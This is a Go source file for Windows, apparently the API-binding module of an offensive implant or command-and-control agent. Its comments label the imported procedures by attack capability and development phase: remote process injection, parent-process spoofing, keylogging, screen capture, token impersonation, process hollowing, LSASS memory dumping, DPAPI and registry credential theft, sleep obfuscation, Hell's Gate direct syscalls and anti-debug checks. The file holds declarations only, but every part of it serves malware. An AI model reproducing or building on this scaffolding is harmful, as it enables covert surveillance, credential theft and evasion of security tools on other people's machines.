//go:build windows

package main

import "golang.org/x/sys/windows"

// Windows memory/access constants not in the x/sys/windows package
const (
	memCommit            uint32 = 0x1000
	memReserve           uint32 = 0x2000
	memRelease           uint32 = 0x8000
	pageNoAccess         uint32 = 0x01
	pageReadWrite        uint32 = 0x04
	pageExecRead         uint32 = 0x20
	pageExecuteReadWrite uint32 = 0x40
	processAllAccess     uint32 = 0x1F0FFF
	threadAllAccess      uint32 = 0x1F03FF
	th32csSnapThread     uint32 = 0x00000004

	// PPID spoofing
	extendedStartupInfoPresent       uint32  = 0x00080000
	procThreadAttributeParentProcess uintptr = 0x00020000
	createNewConsole                 uint32  = 0x00000010

	// Token constants
	tokenAllAccess          uint32 = 0xF01FF
	securityImpersonation   uint32 = 2
	tokenTypePrimary        uint32 = 1
	tokenTypeImpersonation  uint32 = 2
	logon32LogonInteractive uint32 = 2
	logon32ProviderDefault  uint32 = 0

	// GDI constants
	srccopy   uint32 = 0x00CC0020
	smCxscreen        = 0
	smCyscreen        = 1
	dibRGBColors      = 0
	biRgb             = 0

	// Process snapshot
	th32csSnapProcess uint32 = 0x00000002
)

var (
	modKernel32 = windows.NewLazySystemDLL("kernel32.dll")
	modUser32   = windows.NewLazySystemDLL("user32.dll")
	modGdi32    = windows.NewLazySystemDLL("gdi32.dll")
	modAdvapi32 = windows.NewLazySystemDLL("advapi32.dll")

	// Injection
	procCreateThread       = modKernel32.NewProc("CreateThread")
	procVirtualAllocEx     = modKernel32.NewProc("VirtualAllocEx")
	procVirtualFreeEx      = modKernel32.NewProc("VirtualFreeEx")
	procWriteProcessMemory = modKernel32.NewProc("WriteProcessMemory")
	procCreateRemoteThread = modKernel32.NewProc("CreateRemoteThread")
	procQueueUserAPC       = modKernel32.NewProc("QueueUserAPC")
	procOpenThread         = modKernel32.NewProc("OpenThread")
	procVirtualProtect     = modKernel32.NewProc("VirtualProtect")

	// Thread/process enumeration
	procCreateToolhelp32Snapshot = modKernel32.NewProc("CreateToolhelp32Snapshot")
	procThread32First            = modKernel32.NewProc("Thread32First")
	procThread32Next             = modKernel32.NewProc("Thread32Next")
	procProcess32First           = modKernel32.NewProc("Process32FirstW")
	procProcess32Next            = modKernel32.NewProc("Process32NextW")

	// PPID spoofing
	procInitializeProcThreadAttributeList = modKernel32.NewProc("InitializeProcThreadAttributeList")
	procUpdateProcThreadAttribute         = modKernel32.NewProc("UpdateProcThreadAttribute")
	procDeleteProcThreadAttributeList     = modKernel32.NewProc("DeleteProcThreadAttributeList")

	// Keylogger
	procGetAsyncKeyState = modUser32.NewProc("GetAsyncKeyState")
	procGetKeyState      = modUser32.NewProc("GetKeyState")

	// Screenshot (GDI)
	procGetDC                = modUser32.NewProc("GetDC")
	procReleaseDC            = modUser32.NewProc("ReleaseDC")
	procGetSystemMetrics     = modUser32.NewProc("GetSystemMetrics")
	procCreateCompatibleDC   = modGdi32.NewProc("CreateCompatibleDC")
	procCreateCompatibleBitmap = modGdi32.NewProc("CreateCompatibleBitmap")
	procSelectObject         = modGdi32.NewProc("SelectObject")
	procBitBlt               = modGdi32.NewProc("BitBlt")
	procGetDIBits            = modGdi32.NewProc("GetDIBits")
	procDeleteObject         = modGdi32.NewProc("DeleteObject")
	procDeleteDC             = modGdi32.NewProc("DeleteDC")

	// Token / privilege
	procLogonUser               = modAdvapi32.NewProc("LogonUserW")
	procCreateProcessWithToken  = modAdvapi32.NewProc("CreateProcessWithTokenW")
	procImpersonateLoggedOnUser = modAdvapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf            = modAdvapi32.NewProc("RevertToSelf")

	// Thread context (Phase 4 — hijack / hollowing)
	modNtdll              = windows.NewLazySystemDLL("ntdll.dll")
	procGetThreadContext   = modKernel32.NewProc("GetThreadContext")
	procSetThreadContext   = modKernel32.NewProc("SetThreadContext")
	procSuspendThread      = modKernel32.NewProc("SuspendThread")
	procResumeThread       = modKernel32.NewProc("ResumeThread")
	procNtUnmapViewOfSection = modNtdll.NewProc("NtUnmapViewOfSection")
	procNtCreateSection    = modNtdll.NewProc("NtCreateSection")
	procNtMapViewOfSection = modNtdll.NewProc("NtMapViewOfSection")
	procLoadLibraryA       = modKernel32.NewProc("LoadLibraryA")
	procGetModuleHandleW   = modKernel32.NewProc("GetModuleHandleW")
	procCreateTimerQueueTimer = modKernel32.NewProc("CreateTimerQueueTimer")
	procDeleteTimerQueueTimer = modKernel32.NewProc("DeleteTimerQueueTimer")
	procQueueUserWorkItem  = modKernel32.NewProc("QueueUserWorkItem")

	// Credential access (Phase 5)
	modDbgHelp              = windows.NewLazySystemDLL("dbghelp.dll")
	modCrypt32              = windows.NewLazySystemDLL("crypt32.dll")
	procMiniDumpWriteDump   = modDbgHelp.NewProc("MiniDumpWriteDump")
	procCryptUnprotectData  = modCrypt32.NewProc("CryptUnprotectData")
	procRegSaveKeyW         = modAdvapi32.NewProc("RegSaveKeyW")
	procOpenClipboard       = modUser32.NewProc("OpenClipboard")
	procCloseClipboard      = modUser32.NewProc("CloseClipboard")
	procGetClipboardData    = modUser32.NewProc("GetClipboardData")
	procGlobalLock          = modKernel32.NewProc("GlobalLock")
	procGlobalUnlock        = modKernel32.NewProc("GlobalUnlock")
	procGlobalSize          = modKernel32.NewProc("GlobalSize")

	// HWBP / VEH (Phase 8)
	procAddVectoredExceptionHandler    = modKernel32.NewProc("AddVectoredExceptionHandler")
	procRemoveVectoredExceptionHandler = modKernel32.NewProc("RemoveVectoredExceptionHandler")

	// Anti-debug (Phase 10)
	procIsDebuggerPresent          = modKernel32.NewProc("IsDebuggerPresent")
	procCheckRemoteDebuggerPresent = modKernel32.NewProc("CheckRemoteDebuggerPresent")
	procNtQueryInformationProcess  = modNtdll.NewProc("NtQueryInformationProcess")
	procGetTickCount64             = modKernel32.NewProc("GetTickCount64")
	procOutputDebugStringW         = modKernel32.NewProc("OutputDebugStringW")

	// Sleep obfuscation (Phase 6)
	modAdvapi32Sys        = windows.NewLazySystemDLL("advapi32.dll")
	procSystemFunction032 = modAdvapi32Sys.NewProc("SystemFunction032") // RC4 encrypt/decrypt

	// Hell's Gate — direct syscall support (Phase 7)
	procNtProtectVirtualMemory = modNtdll.NewProc("NtProtectVirtualMemory")
	procNtAllocateVirtualMemory = modNtdll.NewProc("NtAllocateVirtualMemory")
	procNtWriteVirtualMemory    = modNtdll.NewProc("NtWriteVirtualMemory")
	procNtCreateThreadEx        = modNtdll.NewProc("NtCreateThreadEx")

	// LSASS alternative techniques (Phase 5)
	procRtlReportSilentProcessExit = modNtdll.NewProc("RtlReportSilentProcessExit")
	procNtDuplicateObject          = modNtdll.NewProc("NtDuplicateObject")

	// .NET / CLR hosting (Phase 9)
	procCLRCreateInstance = windows.NewLazyDLL("mscoree.dll").NewProc("CLRCreateInstance")
)
